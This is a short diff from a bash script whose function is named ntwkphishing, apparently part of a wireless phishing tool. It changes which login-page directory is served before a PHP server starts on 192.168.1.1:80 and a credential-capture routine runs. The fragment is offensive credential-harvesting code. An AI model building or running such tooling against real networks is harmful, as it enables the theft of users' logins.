@@ -438,13 +438,13 @@ ntwkphishing() {
 			fi
 			
 			if [ $check_logins -eq 1 ]; then
-				tput civis; pushd $template > /dev/null 2>&1
+				tput civis; pushd $usedlogin > /dev/null 2>&1
 				echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
 				php -S 192.168.1.1:80 > /dev/null 2>&1 &
 				sleep 2
 				popd > /dev/null 2>&1; credentials
 			elif [ $check_logins -eq 2 ]; then
-				tput civis; pushd $template > /dev/null 2>&1
+				tput civis; pushd $usedlogin > /dev/null 2>&1
 				echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
 				php -S 192.168.1.1:80 > /dev/null 2>&1 &
 				sleep 2
